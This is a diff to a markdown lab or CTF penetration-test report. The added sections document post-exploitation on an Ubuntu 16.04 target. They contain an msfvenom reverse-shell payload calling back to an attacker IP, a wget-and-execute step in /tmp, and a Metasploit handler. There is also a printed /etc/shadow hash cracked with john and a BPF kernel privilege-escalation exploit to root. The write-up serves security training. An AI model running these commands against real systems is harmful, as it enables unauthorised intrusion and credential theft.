@@ -333,20 +333,165 @@ chmod +x shell.elf
 
 
 ### **Payload Execution Metasploit**
-While the payload was being transferred and prepared on the victim machine, a listener was set up on the attacking machine using *Metasploit's `multi/handler` module*. This module is designed to catch incoming reverse shell connections.
+While the payload was being transferred and prepared on the victim machine, a listener was set up on the attacking machine using *Metasploit's `multi/handler` module*. This module is designed to catch incoming reverse shell connections.  
 
 ```bash
-msfconsole 
-use exploit/multi/handler 
+msfconsole
+use exploit/multi/handler
 set PAYLOAD linux/x86/meterpreter/reverse_tcp
 set LHOST <attacker_IP>
 set LPORT 4444
 run -j
 ```
-
-
 ![System acces granted](/assets/images/posts/atrium-report/startmsf.png )
 ![System acces granted](/assets/images/posts/atrium-report/startmsf1.png )
 
 
 Once the payload was executed on the victim, the handler caught the connection, and a *Meterpreter session* was successfully established. This provided a stable and powerful platform for conducting further post-exploitation activities and privilege escalation.
+
+
+
+# **Phase 3: Post-Exploitation**
+
+#### Objective
+The primary goal of this phase was to leverage the established reverse shell access to perform an in-depth system enumeration, escalate privileges to root, and gather critical information. This process is essential for understanding the compromised environment and achieving complete control.
+
+![Initial Meterpreter access](/assets/images/posts/atrium-report/acces.png)
+
+### **Privilege Escalation on Linux (Kernel 4.4.0-87-generic)**
+
+ **Initial Context**
+With an initial foothold as the low-privileged `www-data` user, the next step was to escalate privileges to `root`. The target machine's operating system and kernel version were identified as key pieces of information for this process.
+- *Initial Access* Reverse Shell → Meterpreter
+- *Compromised User*: `www-data`
+- *Operating System*: Ubuntu 16.04
+- *Kernel*: `4.4.0-87-generic`    
+- *Tools Used*: LinPEAS, pspy, msfvenom, Metasploit, john    
+- *Limitations*: There was no `sudo` access, and key scripts used absolute paths, which prevented `PATH` manipulation attacks.    
+
+![System information from Meterpreter](/assets/images/posts/atrium-report/)
+![Running LinPEAS](/assets/images/posts/atrium-report/)
+
+
+**Enumeration with LinPEAS and PSPY**
+To identify potential privilege escalation vectors, enumeration tools like *LinPEAS* and *PSPY* were used. PSPY, in particular, was run to monitor processes and detect:
+
+- SUID binaries    
+- Files with insecure permissions    
+- Periodically executed crons or scripts    
+- System configurations that might allow privilege escalation    
+- Presence of containers    
+- Manipulable `PATH`
+    
+
+*Key Finding*
+PSPY detected that the `/opt/james-2.3.2.1/bin/run.sh` script was being executed automatically, potentially by a cron job. However, it was confirmed that this script uses *absolute paths*, which prevents a `PATH` manipulation attack.
+![PSPY output showing `run.sh`](/assets/images/posts/atrium-report/)
+
+
+
+### **Attempt to Crack Hashes**
+
+*Cracking the Hash from `/etc/shadow`*
+During the enumeration phase, a hash for the user `deloitte` was found in the `/etc/shadow` file. This file contains encrypted password information for user accounts. 
+
+**Hash:** `deloitte:$1$9ABWnCp/$jCaUM7F57.NTzp60E2x2d/:17507:0:99999:7:::`
+
+This hash was saved to a file and passed to *John the Ripper* to attempt cracking it using the `rockyou.txt` wordlist, a common dictionary for brute-force attacks.
+
+```Bash
+john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
+```
+
+As seen in the screenshot, the cracking process was initiated. This is a standard procedure in post-exploitation to obtain plaintext passwords and potentially gain access to other user accounts.
+
+
+
+# 4. 💉Creating and Executing the Payload in `/tmp`
+
+#### **Generating the Meterpreter Payload**
+
+To escalate from a low-privileged shell to a more robust **Meterpreter** session, a payload was generated using **MSFvenom**. The payload was an ELF executable designed for a Linux x64 architecture, configured to connect back to the attacker's machine.
+```Bash
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.0.21 LPORT=4444 -f elf > s.elf
+```
+
+The payload file `s.elf` was then made executable and served from a temporary Python HTTP server on the attacker's machine.
+
+#### **Transferring and Executing the Payload**
+
+On the victim's machine, the payload was downloaded to the `/tmp` directory, a common writable location. It was then granted executable permissions and run, which initiated a callback to the Metasploit handler.
+
+```Bash
+cd /tmp
+wget http://192.168.0.21:8/s.elf
+chmod +x s.elf
+./s.elf
+```
+
+---
+
+### **Privilege Escalation**
+
+*Objective*
+The primary goal was to obtain **root** privileges on the victim machine by exploiting known local vulnerabilities, leveraging the access previously gained through the Meterpreter session.
+
+#### Compromised System State
+With a stable Meterpreter session established, we were able to gather key system information essential for the next steps.
+- *Active Session*: `meterpreter`, SESSION 1.    
+- *Kernel Detected*: `Linux victim 4.4.0-87-generic #110-Ubuntu SMP Fri Jul 21 10:27:21 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux`.    
+
+#### **Vulnerability Enumeration**
+
+To identify potential exploits, the `post/multi/recon/local_exploit_suggester` module in Metasploit was used. This powerful tool automatically scans the compromised system's kernel and configuration to suggest compatible local exploits.
+
+```Bash
+use post/multi/recon/local_exploit_suggester
+set SESSION 1
+run
+```
+
+![Meterpreter acces](/assets/images/posts/atrium-report/pwed.png )
+
+
+# **Final Phase: Privilege Escalation to Root**
+
+*Objective*
+
+The final objective was to gain **root** privileges on the victim machine by exploiting a known local vulnerability.
+
+#### **Context**
+With a stable `meterpreter` session, a preliminary vulnerability assessment was conducted. The target system was identified as **Ubuntu 16.04** running a **Linux Kernel 4.4.0-87-generic**. This information was crucial for selecting a compatible exploit.
+
+#### **Exploit Execution**
+The **Metasploit Framework** was used to exploit the system. Based on the previous enumeration, the `exploit/linux/local/bpf_sign_extension_priv_esc` module was chosen as it's known to affect the identified kernel version.
+
+```Bash
+use exploit/linux/local/bpf_sign_extension_priv_esc
+set SESSION 1
+set LHOST <local_IP/tun0>
+set LPORT 4445
+set PAYLOAD linux/x64/meterpreter/reverse_tcp
+run
+```
+
+#### Result
+
+The exploit was successful, and a new **meterpreter session** with **root** privileges was obtained. This confirmed a complete system compromise.
+
+## ROOT:
+![Acces root](/assets/images/posts/atrium-report/root.png )
+
+---
+
+### **Captured Flags and Findings**
+Throughout the engagement, a number of flags and key pieces of information were retrieved, confirming successful compromises at various stages.
+- **Initial Flags:**    
+    - `flag.txt` found via anonymous FTP access.        
+    - `FLAGH{BYPASSING_HTTP_METH=DS_G00D!}` obtained from the `/login_2/` endpoint by bypassing the login form with a POST request.        
+    - `flag.txt` found on the web server.    
+
+- **Privileged Findings:**    
+    - *Root Flag:* A final flag, located in a restricted directory, was captured after gaining `root` access.        
+    - *User Hash:* The hash for the `deloitte` user was found in the `/etc/shadow` file.        
+    - *.bash_history:* The `.bash_history` file provided valuable insights into the commands executed on the system by the local users.
